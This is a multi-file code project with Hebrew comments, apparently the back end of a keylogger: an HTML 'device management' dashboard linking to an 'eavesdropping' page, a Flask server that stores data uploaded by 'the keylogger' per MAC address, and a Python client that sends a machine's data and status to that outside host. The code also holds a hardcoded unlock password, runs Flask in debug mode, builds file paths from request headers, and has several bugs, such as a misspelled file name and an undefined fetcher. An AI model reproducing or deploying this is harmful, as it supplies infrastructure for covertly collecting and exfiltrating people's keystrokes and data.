@ index.html:
<!DOCTYPE html>
<html lang="he" dir="rtl">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Matrix Device Manager</title>
 
</head>

<body>
  <canvas id="matrix-bg"></canvas>
  <div class="container">
    <h1>מערכת ניהול מכשירים</h1>
    <div class="devices-grid" id="devicesGrid"></div>
    <div id="loadingMessage">טוען מכשירים...</div>
  </div>

  <!-- חלונית הגדרות -->
  <div class="modal" id="settingsModal">
    <div class="modal-content">
      <span class="close-modal" onclick="closeModal()">×</span>
      <h2>הגדרות מכשיר</h2>
      <div class="settings-group">
        <label>שם מכשיר:</label>
        <input type="text" id="deviceName">
      </div>
      <div class="settings-group">
        <label>מקום אחסון:</label>
        <select id="storageLocation">
          <option value="server">שרת</option>
          <option value="file">קובץ JSON מקומי</option>
        </select>
      </div>
      <div class="settings-group">
        <label>תדירות שמירה (בדקות):</label>
        <input type="number" id="saveFrequency" min="1" value="5">
      </div>
      <div class="settings-group">
        <label>הגבלת זמן:</label>
        <input type="checkbox" id="enableTimeLimit" onchange="toggleTimeInputs()">
        <div id="timeInputs" style="display: none;">
          <input type="number" id="days" placeholder="ימים" min="0">
          <input type="number" id="hours" placeholder="שעות" min="0" max="23">
          <input type="number" id="minutes" placeholder="דקות" min="0" max="59">
        </div>
      </div>
      <button class="button" onclick="saveSettings()">שמור הגדרות</button>
    </div>
  </div>

  <!-- מסך נעילה -->
  <div class="lock-screen" id="lockScreen">
    <div class="cyber-lines"></div>
    <div class="lock-content">
      <div class="lock-icon">🔒</div>
      <div class="unlock-form">
        <h2>מערכת נעולה</h2>
        <input type="password" class="password-input" id="unlockPassword" placeholder="הזן סיסמה">
        <button class="unlock-button" onclick="attemptUnlock()">שחרר נעילה</button>
      </div>
    </div>
  </div>

  <script>
    // ------------ מסך נעילה ------------
    let lockTimeout;
    const LOCK_DELAY = 300000; // 5 דקות
    const SYSTEM_PASSWORD = '1234';

    function initLockScreen() {
      // בכל אינטראקציה של המשתמש בדף, נאפס טיימר
      document.addEventListener('mousemove', resetLockTimer);
      document.addEventListener('keypress', resetLockTimer);
      document.addEventListener('click', resetLockTimer);
      resetLockTimer();
    }

    function resetLockTimer() {
      clearTimeout(lockTimeout);
      lockTimeout = setTimeout(lockScreen, LOCK_DELAY);
    }

    function lockScreen() {
      document.getElementById('lockScreen').classList.add('active');
    }

    function attemptUnlock() {
      const password = document.getElementById('unlockPassword').value;
      if (password === SYSTEM_PASSWORD) {
        document.getElementById('lockScreen').classList.remove('active');
        document.getElementById('unlockPassword').value = '';
        resetLockTimer();
      } else {
        const lockScreen = document.getElementById('lockScreen');
        // הפעלה קצרה של אפקט "גליץ'"
        lockScreen.style.animation = 'none';
        lockScreen.offsetHeight; // טריק לאיפוס ה־animation
        lockScreen.style.animation = 'glitch 0.3s linear';
      }
    }

    document.getElementById('unlockPassword').addEventListener('keypress', function (e) {
      if (e.key === 'Enter') {
        attemptUnlock();
      }
    });

    document.addEventListener('DOMContentLoaded', initLockScreen);


    // ------------ אפקט מטריקס ברקע ------------
    const canvas = document.getElementById('matrix-bg');
    const ctx = canvas.getContext('2d');

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const matrix = "אבגדהוזחטיכלמנסעפצקרשת0123456789";
    const drops = [];
    const fontSize = 16;
    const columns = canvas.width / fontSize;

    for (let i = 0; i < columns; i++) {
      // נבחר מיקום התחלתי רנדומלי לכל עמודה
      drops[i] = Math.random() * canvas.height / fontSize;
    }

    function drawMatrix() {
      ctx.fillStyle = 'rgba(13, 13, 26, 0.1)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = 'rgba(0, 255, 65, 0.8)';
      ctx.font = fontSize + 'px monospace';

      // נצייר את התווים בעזרת for
      for (let i = 0; i < drops.length; i++) {
        const text = matrix[Math.floor(Math.random() * matrix.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        // אם ירדנו מתחתית המסך או בהסתברות מסוימת – נאתחל מחדש
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
          drops[i] = 0;
        }
        drops[i] += 0.5 + Math.random() * 0.5;
      }
    }

    setInterval(drawMatrix, 40);


    // ------------ ניהול מכשירים ------------
    let devices = [];
    const SERVER_URL = 'https://key-logger-server.onrender.com'; // כתובת השרת (לדוגמה)

    // נתוני דוגמה (מכשירים) למקרה בו אחזור מהשרת נכשל
    const mockDevices = [
      {
        macAddress: "00:11:22:33:44:55",
        name: "מחשב נייד של הרשי",
        connected: true,
        timeLimit: 180,
        storageLocation: "server",
        lastSeen: "2024-02-23 10:30"
      },
      {
        macAddress: "66:77:88:99:AA:BB",
        name: "טאבלט משפחתי",
        connected: false,
        timeLimit: null,
        storageLocation: "file",
        lastSeen: "2024-02-22 15:45"
      }
    ];

    let currentMac = null;

    // שלב 1: הבאת המכשירים מהשרת
    async function fetchDevices() {
      document.getElementById('loadingMessage').style.display = 'block';
      try {
        const response = await fetch(`${SERVER_URL}/api/status/all`);
        if (!response.ok) {
          throw new Error(`Error fetching devices: ${response.status}`);
        }
        const data = await response.json();
        console.log(data)
        if (!data || data.length === 0) {
          throw new Error("No devices found in the response");
        }
        devices = data;
      } catch (error) {
        console.error('Error fetching devices:', error);
        // במקרה של שגיאה, נשתמש ב־mockDevices כדוגמה
        devices = mockDevices;
      }
      renderDevices();
      document.getElementById('loadingMessage').style.display = 'none';
    }

    // שלב 2: הצגת המכשירים על המסך
    function renderDevices() {
      const grid = document.getElementById('devicesGrid');
      let htmlStr = '';

      // נבצע לולאה על מערך המכשירים
      for (let i = 0; i < devices.length; i++) {
        const device = devices[i];
        htmlStr += `
          <div class="device-card">
            <div class="device-header">
              <span class="device-name">${device.name || device.macAddress}</span>
              <span class="status-indicator ${device.connected ? 'status-connected' : 'status-disconnected'}"></span>
            </div>
            <div class="device-info">
              <div>MAC: ${device.macAddress}</div>
              <div>סטטוס: ${device.connected ? 'מחובר' : 'מנותק'}</div>
              ${device.timeLimit ? `<div>זמן נותר: ${formatTimeRemaining(device.timeLimit)}</div>` : ''}
              <div>אחסון: ${device.storageLocation || ''}</div>
              <div>נראה לאחרונה: ${device.lastSeen || ''}</div>
            </div>
            <button class="button" onclick="openSettings('${device.macAddress}')">הגדרות</button>
            <a class="button" href="eavesdropping.html?mac=${device.macAddress}">צפה בהאזנות</a>
          </div>
        `;
      }
      grid.innerHTML = htmlStr;
    }

    // עוזר: מפרמט זמן מוגבל ב־(דקות->ימים/שעות/דקות)
    function formatTimeRemaining(timeLimit) {
      const days = Math.floor(timeLimit / (24 * 60));
      const hours = Math.floor((timeLimit % (24 * 60)) / 60);
      const minutes = timeLimit % 60;
      return `${days}d ${hours}h ${minutes}m`;
    }

    // שלב 3: פתיחת חלונית הגדרות למכשיר ספציפי
    function openSettings(macAddress) {
      currentMac = macAddress;

      // נחפש את המכשיר המתאים
      const device = devices.find(d => d.macAddress === macAddress);
      if (!device) return;

      // נכניס לערכי הטופס את המידע הקיים
      document.getElementById('deviceName').value = device.name || '';
      document.getElementById('storageLocation').value = device.storageLocation || 'server';
      document.getElementById('saveFrequency').value = 5;

      document.getElementById('enableTimeLimit').checked = !!device.timeLimit;
      toggleTimeInputs();

      if (device.timeLimit) {
        const days = Math.floor(device.timeLimit / (24 * 60));
        const hours = Math.floor((device.timeLimit % (24 * 60)) / 60);
        const minutes = device.timeLimit % 60;
        document.getElementById('days').value = days;
        document.getElementById('hours').value = hours;
        document.getElementById('minutes').value = minutes;
      } else {
        document.getElementById('days').value = '';
        document.getElementById('hours').value = '';
        document.getElementById('minutes').value = '';
      }

      document.getElementById('settingsModal').style.display = 'block';
    }

    // סגירת חלונית ההגדרות
    function closeModal() {
      document.getElementById('settingsModal').style.display = 'none';
      currentMac = null;
    }

    // הצגת/הסתרת שדות הזמן אם סימנו הגבלת זמן
    function toggleTimeInputs() {
      const timeInputs = document.getElementById("timeInputs");
      if (document.getElementById("enableTimeLimit").checked) {
        timeInputs.style.display = "block";
      } else {
        timeInputs.style.display = "none";
      }
    }

    // המרה של ימים/שעות/דקות למספר דקות כולל
    function getTimeLimitInMinutes() {
      const days = parseInt(document.getElementById('days').value) || 0;
      const hours = parseInt(document.getElementById('hours').value) || 0;
      const minutes = parseInt(document.getElementById('minutes').value) || 0;
      return (days * 24 * 60) + (hours * 60) + minutes;
    }

    // שלב 4: שמירת הגדרות
    async function saveSettings() {
      // אם לא בחרנו מכשיר כלשהו, פשוט נסגור
      if (!currentMac) {
        closeModal();
        return;
      }

      // נמצא את המכשיר הקיים כדי להשוות
      let device = devices.find(d => d.macAddress === currentMac);
      if (!device) {
        closeModal();
        return;
      }

      // נקרא את הערכים החדשים מתוך הטופס
      let newName = document.getElementById('deviceName').value;
      let newTimeLimit = document.getElementById('enableTimeLimit').checked ? getTimeLimitInMinutes() : null;
      let newStorageLocation = document.getElementById('storageLocation').value;
      let newSaveFrequency = parseInt(document.getElementById('saveFrequency').value) || 5;

      // נייצר אובייקט לצבירת השינויים בלבד
      let changedData = {
        name: "",
        timeLimit: "",
        storageLocation: "",
        saveFrequency: ""
      };

      // נשמור את ערכי המכשיר הקיים לצורך השוואה
      let oldName = device.name || "";
      let oldTimeLimit = device.timeLimit || null;
      let oldStorageLocation = device.storageLocation || "";
      let oldSaveFrequency = device.saveFrequency || 5;
      // (אם לא הגדרנו קודם saveFrequency במכשיר, נניח 5 כערך בסיסי)

      // נשתמש במערך שדות כדי לבצע השוואה ב־for
      let fields = ["name", "timeLimit", "storageLocation", "saveFrequency"];
      for (let i = 0; i < fields.length; i++) {
        let field = fields[i];
        // נבדוק באיזה שדה מדובר, נשווה בין הישן לחדש
        if (field === "name" && newName !== oldName) {
          changedData.name = newName;
        }
        else if (field === "timeLimit" && newTimeLimit !== oldTimeLimit) {
          changedData.timeLimit = newTimeLimit;
        }
        else if (field === "storageLocation" && newStorageLocation !== oldStorageLocation) {
          changedData.storageLocation = newStorageLocation;
        }
        else if (field === "saveFrequency" && newSaveFrequency !== oldSaveFrequency) {
          changedData.saveFrequency = newSaveFrequency;
        }
      }

      // נבדוק האם בוצע שינוי כלשהו
      let noChanges = true;
      for (let i = 0; i < fields.length; i++) {
        let field = fields[i];
        // אם יש ערך שאינו ריק (או null במקרה של timeLimit)
        if (changedData[field] !== "" && changedData[field] !== null) {
          noChanges = false;
          break;
        }
      }

      // אם לא שונה כלום, נצא
      if (noChanges) {
        alert('לא שונה כלום');
        closeModal();
        return;
      }

      // שלב 5: שליחת השינויים בלבד לשרת
      try {
        const response = await fetch(`${SERVER_URL}/api/status/change`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'Mac-Address': currentMac
          },
          // שולחים רק את הערכים ששונו, והשאר ריקים – כך מבליטים מה נשמר
          body: JSON.stringify(changedData)
        });

        if (!response.ok) {
          throw new Error(`שגיאה בעדכון המכשיר: ${response.status}`);
        }

        alert('ההגדרות עודכנו בהצלחה!');
      } catch (err) {
        console.error(err);
        alert('לא הצלחנו לעדכן את המכשיר בשרת.');
      }

      closeModal();
      fetchDevices();
    }

    // שלב 6: ברגע שהדף נטען, מביאים את רשימת המכשירים. 
    // בנוסף, נרענן את הרשימה כל 30 שניות (סתם בתור דוגמה).
    document.addEventListener('DOMContentLoaded', fetchDevices);
    setInterval(fetchDevices, 30000);
  </script>
</body>


</html>


@ server run on https://key-logger-server.onrender.com:
from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)


def write_to_json(name_j, data):
    """ פונקציה לשמירת נתונים בקובץ JSON """
    try:
        file_path = f"{name_j}.json"

        # אם הקובץ קיים - טוענים את הנתונים הקיימים, אחרת יוצרים מילון ריק
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as file:
                    data_json = json.load(file)
            except json.JSONDecodeError:
                data_json = {}  # אם יש בעיה בקובץ, נאתחל אותו
        else:
            data_json = {}

        # עדכון הנתונים
        data_json.update(data)

        # שמירה חזרה לקובץ
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data_json, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print("❌ שגיאה בכתיבת JSON:", e)  # הדפסת שגיאה


@app.route('/api/status/update', methods=['POST'])
def status_update():
    print("/api/status/update")
    """ מקבל נתוני סטטוס מהקיי לוגר ושומר בקובץ לפי כתובת ה-MAC """
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = data.get("macAddress")
        if not mac_address:
            return jsonify({"error": "Missing macAddress"}), 400

        status = {mac_address: data}
        write_to_json("device_status", status)
        print("📥 נתונים שהתקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה:", e)
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/upload', methods=['POST'])
def data_upload():
    """ קבלת נתונים מהקיי לוגר ושמירתם לפי כתובת ה-MAC """
    print("/api/data/upload")
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = request.headers.get("mac_address")
        if not mac_address:
            return jsonify({"error": "Missing mac_address in headers"}), 400

        write_to_json(mac_address, data)
        print("📥 נתונים שהתקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה:", e)
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/files', methods=['GET'])
def get_data():
    """ שליפת נתונים מהשרת עבור הקיי לוגר לפי כתובת MAC """
    print("/api/data/files")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open(f"{mac_address}.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print("📤 נתונים שנשלחו:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify({"error": f"No data found for MAC: {mac_address}"}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/all', methods=['GET'])
def get_status_all():
    """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים עבור הדף אינטרנט """
    print("/api/status/all")
    try:
        with open("evice_status.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print("📤 נתונים שנשלחו:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify({"error": f"No data found "}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/check', methods=['GET'])
def check_status():
    """ בדיקת (מהקיי לוגר) הסטטוס האחרון של המכשיר לפי MAC ע"י הקיי לוגר """
    print("/api/status/check")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open("change_device_status.json", "r", encoding="utf-8") as file:
            status_json = json.load(file)
            device_status = status_json.get(mac_address)

            if not device_status:
                return jsonify({"message": "No status found"}), 404

            print("📤 נתונים שנשלחו:", device_status)
            return jsonify(device_status)
    except FileNotFoundError:
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/change', methods=['POST'])
def change_status():
    """ מקבל נתוני סטטוס מהאתר ושומר בקובץ לפי כתובת ה-MAC """
    print("api/status/change")
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = data.get("Mac-Address")
        if not mac_address:
            return jsonify({"error": "Missing macAddress"}), 400

        status = {mac_address: data}
        write_to_json("change_device_status", status)
        print("📥 Received data:", data)
        return jsonify({"message": "Success"}), 200
    except FileNotFoundError:
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500
    except Exception as e:
        print("❌ Error:", e)
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)

@ api_server:
from abc import ABC, abstractmethod
import requests
import json
import uuid

mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))


class APIServer(ABC):
    """
    מחלקה אבסטרקטית לייצוג שרת API.
    כל מחלקה היורשת ממנה חייבת לממש את המתודה 'interact_with_server'.
    """

    @abstractmethod
    def interact_with_server(self, *args, **kwargs):
        pass


class StatusUpdater(APIServer):
    """
    שולח בקשת POST לעדכון סטטוס הפרויקט.
    """

    def interact_with_server(self, status_data):

        url = "https://key-logger-server.onrender.com/api/status/update"
        try:
            response = requests.post(url, json=status_data)
            response.raise_for_status()  # הרם שגיאה עבור קודי סטטוס שגיאה (4xx או 5xx)
            print(f"------------ הודעה נשלחה בהצלחה ----------------\n {status_data}")
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בעדכון סטטוס: {e}")
            return None


class DataFileWriter(APIServer):
    """
    שולח בקשת POST לעדכון קובץ דאטא של מחשב ספציפי לפי כתובת MAC.
    """

    def interact_with_server(self, file_data, mac_address=mac_address):

        url = "https://key-logger-server.onrender.com/api/data/upload'"  # החלף בכתובת ה-URL האמיתית
        try:
            response = requests.post(url, json=file_data, headers={"mac_address": mac_address})
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בעדכון קובץ דאטא עבור MAC {mac_address}: {e}")
            return None


class StatusChecker(APIServer):
    """
    שולח בקשת GET כדי לדעת האם יש שינויים בסטטוסים.
    """

    def interact_with_server(self):
        """
        שולח בקשת GET לבדיקת שינויים בסטטוסים.

        :return: תגובת השרת (requests.Response).
        """
        url = "https://key-logger-server.onrender.com/check_status_changes"  # החלף בכתובת ה-URL האמיתית
        try:
            response = requests.get(url)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(f"שגיאה בבדיקת שינויי סטטוס: {e}")
            return None


class RequestManager:
    """
    מנהל את הבקשות ומנתב אותן למחלקה המתאימה בהתאם למטודה וסוג הבקשה.
    """

    def __init__(self):
        self.status_updater = StatusUpdater()
        self.data_file_writer = DataFileWriter()
        self.status_checker = StatusChecker()

    def handle_request(self, method, request_type, kwargs):
        """
        מטפל בבקשה ומנתב אותה למחלקה המתאימה.

        :param method: שיטת הבקשה ('GET' או 'POST').
        :param request_type: סוג הבקשה ('status', 'data', 'dag').
        :param kwargs: ארגומנטים נוספים שיעברו למתודת 'interact_with_server'.
        :return: תגובת השרת או None במקרה של שגיאה.
        :raises ValueError: אם סוג בקשה לא חוקי.
        """
        if method.upper() == 'POST':
            if request_type == 'status':
                return self.status_updater.interact_with_server(kwargs)
            elif request_type == 'data':
                return self.data_file_writer.interact_with_server(kwargs)
            else:
                raise ValueError(f"סוג בקשה לא חוקי עבור POST: {request_type}")
        elif method.upper() == 'GET':
            if request_type == 'status':
                return self.status_checker.interact_with_server(kwargs)
            elif request_type == 'dag':
                return self.dag_file_fetcher.interact_with_server(kwargs)
            else:
                raise ValueError(f"סוג בקשה לא חוקי עבור GET: {request_type}")
        else:
            raise ValueError(f"שיטת בקשה לא חוקית: {method}")
